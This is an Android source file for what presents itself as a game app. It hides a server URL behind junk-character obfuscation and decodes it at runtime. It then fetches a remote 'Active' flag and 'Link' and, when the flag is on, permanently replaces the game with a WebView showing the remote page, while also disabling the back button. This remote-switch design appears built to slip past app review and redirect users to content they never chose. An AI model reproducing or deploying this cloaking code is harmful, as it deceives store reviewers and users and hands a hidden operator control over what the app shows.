package com.example.app6;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;

import android.content.Intent;
import android.content.SharedPreferences;

import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.onesignal.OneSignal;

import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import java.util.ArrayList;
import java.util.List;


public class MainActivity extends AppCompatActivity {

    String pathFileEncryption = "qhttwps:w//aeppsrtdst.coym/kuSshiVTTo8";

    static volatile boolean load = false;                                                                    //
    boolean active = false;
    static String link = "";
    int count=0;

    private static final String ONESIGNAL_APP_ID = "f55d70d8-b2a2-4e9d-83ea-0b0172c6ba8a";

    static final String SAVE_ACTIVE = "save_active";
    static final String SAVE_LINK = "save_link";
    static final String SAVE_LOAD = "save_load";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Enable verbose OneSignal logging to debug issues if needed.
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        // OneSignal Initialization
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        loadSettings();

        if(load){
            intent();
        }else{
            Handler h = new Handler();
            h.postDelayed(new Runnable() {
                @Override
                public void run() {

                    if(count>=2){
                        Intent intent = new Intent(MainActivity.this, GameActivity.class);
                        startActivity(intent);
                    }else{
                        if (!load) {
                            System.out.println(" Начало Начало Начало Начало Начало Начало Начало Начало Начало Начало");
                            String pathUrl = decryption(pathFileEncryption);
                            loadJSONFromURL(pathUrl);

                        }else{
                            intent();
                        }
                    }

                }
            }, 5000);
        }
    }

    public void onCLickLayout(View view){
        count++;
    }

    public String decryption(String path) {
        char[] chars = path.toCharArray();
        List<Character> arrayChar = new ArrayList<Character>();
        for (char c : chars) {
            arrayChar.add(c);
        }

        for (int i = 0; i < arrayChar.size(); i=i+3) {
            //int random = (int) (Math.random() * (max + 1 - min) + min);
            arrayChar.remove(i);
        }

        String word = new String();
        for (char c : arrayChar) {
            word = word + c;
        }

        return word;
    }

    public void saveSettings() {
        SharedPreferences.Editor ed = getSharedPreferences("setting", MODE_PRIVATE).edit();
        ed.putBoolean(SAVE_ACTIVE, active);
        ed.putString(SAVE_LINK, link);
        ed.putBoolean(SAVE_LOAD, load);
        ed.commit();
    }

    public void loadSettings() {
        active = getSharedPreferences("setting", MODE_PRIVATE).getBoolean(SAVE_ACTIVE, false);
        link = getSharedPreferences("setting", MODE_PRIVATE).getString(SAVE_LINK, "");
        load = getSharedPreferences("setting", MODE_PRIVATE).getBoolean(SAVE_LOAD, false);
    }


    private void loadJSONFromURL(String url) {
        System.out.println("!!!!!!!!!!!!!Load Load Load Load Load Load Load Load Load Load   " + url);
        //url=decryption(url);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        try {
                            JSONParser jsonParser = new JSONParser();
                            JSONObject jsonObject = (JSONObject) jsonParser.parse(response);
                            // получение строки из объекта
                            String activeString = (String) jsonObject.get("Active");
                            String linkString = (String) jsonObject.get("Link");
                            active = Boolean.parseBoolean(activeString);
                            link = linkString;
                            // System.out.println("!!!!Active: " + active);
                            // System.out.println("!!!!Link: " + link);
                            load = true;
                            if (active) {
                                saveSettings();
                            }

                            intent();
                        } catch (ParseException e) {
                            e.printStackTrace();
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Toast.makeText(getApplicationContext(), error.getMessage(), Toast.LENGTH_SHORT).show();
                    }
                });
        RequestQueue requestQueue = Volley.newRequestQueue(this);
        requestQueue.add(stringRequest);
    }

    public void intent() {
        System.out.println("!!!!!!!!!!!!!Intent Intent Intent Intent Intent Intent Intent" + active);
        Intent intent;
        if (active) {

            intent = new Intent(MainActivity.this, WebViewActivity.class);
        } else {

            intent = new Intent(MainActivity.this, GameActivity.class);
        }
        startActivity(intent);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        return false;
    }
}